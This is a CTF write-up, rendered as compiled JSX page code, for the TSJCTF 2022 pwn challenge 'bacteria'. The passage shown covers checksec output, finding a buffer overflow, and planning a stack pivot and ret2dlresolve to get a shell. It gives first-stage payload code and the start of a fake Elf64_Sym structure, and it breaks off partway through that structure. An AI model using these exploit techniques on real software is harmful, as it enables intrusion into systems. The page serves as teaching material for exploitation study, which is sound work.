a},b=a=\u003eg(o(l(a!=null?d(m(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var r=N((S,i)=\u003e{i.exports=_jsx_runtime});var x={};k(x,{default:()=\u003e_,frontmatter:()=\u003ew});var e=b(r()),w={title:\"TSJCTF 2022 \\u2013 bacteria\",date:\"2022-03-02\",draft:!1,authors:[\"Johnathan\"],tags:[\"TSJCTF 2022\",\"pwn\",\"Shell\",\"Buffer Overflow\",\"Binary Exploit\"],summary:\"Buffer overflow for shell.\",canonical:\"https://github.com/nhtri2003gmail/CTFNote/tree/master/writeup/2022/TSJ-CTF-2022/bacteria\"};function f(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",ul:\"ul\",li:\"li\",pre:\"pre\",code:\"code\",img:\"img\",strong:\"strong\",ol:\"ol\",hr:\"hr\",h3:\"h3\"},a.components),{TOCInline:t}=n;return t||y(\"TOCInline\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"bacteria\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#bacteria\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"bacteria\"]}),`\n`,(0,e.jsx)(t,{toc:a.toc,exclude:[\"bacteria\"],toHeading:3}),`\n`,(0,e.jsxs)(n.p,{children:[\"Origin challenge link: \",(0,e.jsx)(n.a,{href:\"https://chal.ctf.tsj.tw/\",children:\"https://chal.ctf.tsj.tw/\"}),\" (closed)\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"You can also download challenge file in repo: \",(0,e.jsx)(n.a,{href:\"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/TSJ-CTF-2022/bacteria/bacteria.tar.gz\",children:\"bacteria.tar.gz\"})]}),`\n`,(0,e.jsx)(n.p,{children:\"There will be several files in tar as follows:\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"bacteria/docker-compose.yml\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/Dockerfile\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/xinetd\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/bacteria\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/flag\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/getflag\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/run.sh\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Download the tar and untar it, then build with the following command (require \",(0,e.jsx)(n.a,{href:\"https://docs.docker.com/compose/install/\",children:\"docker-compose\"}),\"):\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`docker-compose build \u0026\u0026 docker-compose up\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"And now we\\u2019re ready for the exploitation!\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"1-find-bug\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#1-find-bug\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"1. Find bug\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we will use \",(0,e.jsx)(n.code,{children:\"file\"}),\" to check for basic information (outside docker container):\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"file\"}),` bacteria\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"bacteria: ELF \",(0,e.jsx)(n.span,{className:\"token number\",children:\"64\"}),\"-bit LSB executable, x86-64, version \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"SYSV\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So this is a 64-bit file being stripped, it will be hard when we need to debug. Next, we will use \",(0,e.jsx)(n.code,{children:\"checksec\"}),\" to check for all defences:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`$ checksec bacteria\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Nice! We can see that just \",(0,e.jsx)(n.code,{children:\"NX enabled\"}),\" which means we cannot execute assembly shellcode on stack. Finally, we will use \",(0,e.jsx)(n.code,{children:\"objdump\"}),\" to dump the assembly code of file.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"This is a small binary with just a few assembly code as below:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/objdump.png\",alt:\"objdump.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we have \",(0,e.jsx)(n.code,{children:\"read@plt\"}),\", \",(0,e.jsx)(n.code,{children:\"read@got\"}),\" and \",(0,e.jsx)(n.code,{children:\".text\"}),\" part. In \",(0,e.jsx)(n.code,{children:\".text\"}),\", it first read in 0x20 byte to the current rsp and then set the null byte after that input. Finally it add rsp with 0x10 and return.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So that\\u2019s means we have the \",(0,e.jsx)(n.strong,{children:\"Buffer Overflow\"}),\" bug and that\\u2019s all, we cannot find anything else. So let\\u2019s move on the next part: Brainstorming!\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"2-brainstorming\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#2-brainstorming\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"2. Brainstorming\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we have the \",(0,e.jsx)(n.strong,{children:\"Buffer Overflow\"}),\" bug but because the space for our payload is too small so I intent to do a stack pivot first. But the challenge file has \",(0,e.jsx)(n.code,{children:\"NX enabled\"}),\" so we cannot execute assembly shellcode on it. Also because the binary is small, we don\\u2019t have any gadget to conduct a full ROPgadget or even just a part of ROPgadget.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"But we have \",(0,e.jsx)(n.code,{children:\"read@plt\"}),\", which means it will need to resolve the libc address for the first time. So we have the dlresolver function, all we need now is a \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\". If you don\\u2019t know what it is, you can read \",(0,e.jsx)(n.a,{href:\"https://github.com/nhtri2003gmail/ret2dlresolve-64bit\",children:\"here\"}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, this is a 64-bit file so using \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\" technique may work and may not work for some special case. And we can conduct this technique by 2 ways: faking \",(0,e.jsx)(n.code,{children:\"link_map\"}),\" or faking \",(0,e.jsx)(n.code,{children:\"reloc_arg\"})]}),`\n`,(0,e.jsxs)(n.p,{children:[\"In this challenge, I know that we can fake \",(0,e.jsx)(n.code,{children:\"reloc_arg\"}),\" because the base address of binary is \",(0,e.jsx)(n.code,{children:\"0x400000\"}),\" so \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\" will not cause error (if base address is \",(0,e.jsx)(n.code,{children:\"0x600000\"}),\", the check function of dlresolver will cause error), also because we don\\u2019t have any thing to leak \",(0,e.jsx)(n.code,{children:\"link_map\"}),\" and to overwrite \",(0,e.jsx)(n.code,{children:\"link_map\"}),\" data.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So first, we will try to fake some structures to conduct \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\" to execute whatever function we want. Next, we will try to leak the libc address and then use one gadget to get shell.\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Summary:\",`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Fake structure of Elf64_Sym\"}),`\n`,(0,e.jsx)(n.li,{children:\"Fake structure of Elf64_Rela\"}),`\n`,(0,e.jsx)(n.li,{children:\"Fake STRTAB\"}),`\n`,(0,e.jsx)(n.li,{children:\"Conduct ret2dlresolve\"}),`\n`,(0,e.jsx)(n.li,{children:\"Get shell\"}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"3-exploit\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#3-exploit\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"3. Exploit\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Before we continue our exploit, I write this function to attach gdb to the process of bacteria:\"}),`\n`,(0,e.jsxs)(\"details\",{children:[(0,e.jsx)(\"summary\",{children:\"Code snippet\"}),(0,e.jsx)(\"p\",{children:(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"GDB\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tproc \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'ps'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'aux'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" stdout\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"PIPE\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tps \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" proc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"stdout\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" ps\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'/home/bacteria/bacteria'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"and\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'timeout'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\t\",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change the split to get the correct pid\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'    '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'  '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tlog\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Process pid: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"str\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tcommand \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`'''\n`})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*0x401040\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:\"\t'''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"with\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'wt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"as\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t        f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"write\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"command\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tsubprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'sudo'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/usr/bin/x-terminal-emulator'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'--geometry'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'960x1080+960+0'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-p'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-x'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# input() to make program wait with gdb\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" connect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'127.0.0.1'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"9487\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"GDB\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})})})]}),`\n`,(0,e.jsx)(n.p,{children:\"And remember these GDB command to check for JMPREL, SYMTAB and STRTAB:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/3xg   (JMPREL) + (reloc_arg) * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  p/x     (r_info) \u003e\u003e 32     # symbol_number\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/3xg   (SYMTAB) + (symbol_number) * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/s     (STRTAB) + (st_name)\n`})]})}),`\n`,(0,e.jsx)(n.hr,{}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-1-stack-pivot\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-1-stack-pivot\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 1: Stack pivot\"]}),`\n`,(0,e.jsx)(n.p,{children:\"First, let\\u2019s attach gdb to the process of bacteria in the container to get the read \u0026 write section so that we can do stack pivot:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_rw_section.png\",alt:\"get_rw_section.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we know that at address from \",(0,e.jsx)(n.code,{children:\"0x403000\"}),\" to \",(0,e.jsx)(n.code,{children:\"0x404000\"}),\", the binary is writable. So we will choose an address of \",(0,e.jsx)(n.code,{children:\"0x403e00\"}),\" to stack pivot. Why I choose \",(0,e.jsx)(n.code,{children:\"0x403e00\"}),\", because after the stack pivot, we will conduct the ret2dlresolve, which will need a lot of lower memory to resolve libc address. Choosing \",(0,e.jsx)(n.code,{children:\"0x403e00\"}),\" so we don\\u2019t need to change a lot.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"To do the stack pivot, we also need a \",(0,e.jsx)(n.code,{children:\"leave; ret\"}),\" gadget to change the rsp. But because we will execute the \",(0,e.jsx)(n.code,{children:\".text\"}),\" again so we have \",(0,e.jsx)(n.code,{children:\"leave; ret\"}),\" already. One more thing to notice is that after we stack pivot, the new stack now is inside the binary which doesn\\u2019t have any thing for us to work around. So before we do the stack pivot, we need to write something to the chosen address first.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"As we know that the program will first mov the current rsp to rbp and then mov rbp to rsi and write to rsi. So we just need \",(0,e.jsx)(n.code,{children:\"mov rsi, rbp\"}),\" to write to our desired address passed to rsi by rbp. Our first payload will be as following:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                 \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running script and we stop at ret, we can see that it\\u2019s ready for the next input of 0x20 bytes to the rw_section (by looking at rbp)\"}),`\n`,(0,e.jsxs)(n.p,{children:[`Status of rbp:\n`,(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/rw_section_rbp.png\",alt:\"rw_section_rbp.png\"})]}),`\n`,(0,e.jsxs)(n.p,{children:[`Status of code:\n`,(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/rw_section_code.png\",alt:\"rw_section_code.png\"})]}),`\n`,(0,e.jsx)(n.p,{children:\"That\\u2019s look good! Just leave it here for a while and we will continue building exploit later.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-2-fake-address-and-structure-of-elf64_sym\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-2-fake-address-and-structure-of-elf64_sym\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 2: Fake address and structure of Elf64_Sym\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The reason why I fake Elf64_Sym structure first is because with the address of Elf64_Sym structure, we can calculate the symbol_number and the other stuff.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"So first, we will choose an address for Elf64_Sym so that \",(0,e.jsx)(n.code,{children:\"symbol_numer\"}),\" is an integer:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`    \u003cAddress of Elf64_Sym\u003e = \u003cSYMTAB\u003e + \u003csymbol_number\u003e * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\u003c=\u003e \u003csymbol_number\u003e = ( \u003cAddress of Elf64_Sym\u003e - \u003cSYMTAB\u003e ) / 24\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"After a first trying, we know that we can use the address of rw_section to write our fake Elf64_Sym struct. So now we have:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`SYMTAB = 0x400290\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Elf64_Sym_addr  = rw_section                             = 0x403e00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`symbol_number   = int(( Elf64_Sym_addr - SYMTAB ) / 24)  = 634\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Now, we will create a fake struct for Elf64_Sym. The structure of Elf64_Sym is defined as follows:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsxs)(n.code,{className:\"language-c code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"typedef\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"elf64_sym\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Word st_name\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"       \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Symbol name, index in string table (4 bytes)*/\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"char\"}),\" st_info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Type and binding attributes (1 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"char\"}),\" st_other\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* No defined meaning, 0 (1 bytes) 